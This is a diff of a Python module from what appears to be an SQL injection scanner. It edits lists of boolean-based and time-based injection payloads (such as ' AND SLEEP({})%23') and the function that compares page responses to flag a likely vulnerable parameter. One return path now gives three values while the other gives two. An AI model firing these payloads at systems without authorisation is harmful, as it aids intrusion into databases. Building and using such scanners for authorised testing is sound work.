@@ -1,24 +1,16 @@
 from Modules.ResponseAnalyzer import analyze_response
 from Modules.URLUtils import construct_test_url
-import requests
-
+from Modules.RequestHandler import send_payload
 # SQL injection payloads for testing
-boolean_based_test = [" AND {}", "' AND {}%23", '" AND {}%23']
+boolean_based_test = [" AND {}%23", "' AND {}%23", '" AND {}%23']
 # test_2_payloads = [" AND 1=2", "' AND '1'='2", '" AND "1"="2']
 time_based_payloads = [" AND SLEEP({})", "' AND SLEEP({})%23", '" AND SLEEP({})%23']
 
 
-# Function to send SQL payloads and receive the response
-def send_payload(target_url):
-    response = requests.get(target_url)
-    return response.text
-
-
-# Function to test SQL injection
 def test_boolean_based_sql_injection(target_url, id_value):
     print(f"\nTesting default request: {target_url}")
     default_response = send_payload(target_url)
-    print("Default response length:", len(default_response))
+    print(f"Default response: {default_response}")
 
     # Test: Check for Boolean-based vulnerabilities
     print("\nTesting with Boolean-based conditions:")
@@ -42,7 +34,7 @@ def test_boolean_based_sql_injection(target_url, id_value):
         # 2. Test 2 response != Test 1 response (indicating vulnerability)
         if default_response == test_1_responses[0] and response != test_1_responses[0]:
             print(f"Payload {formatted_payload} indicates a likely vulnerability (Boolean-based SQLi).")
-            return "boolean"
+            return "boolean", formatted_payload, default_response
 
     # If no vulnerabilities found, return None
-    return None
+    return None, None
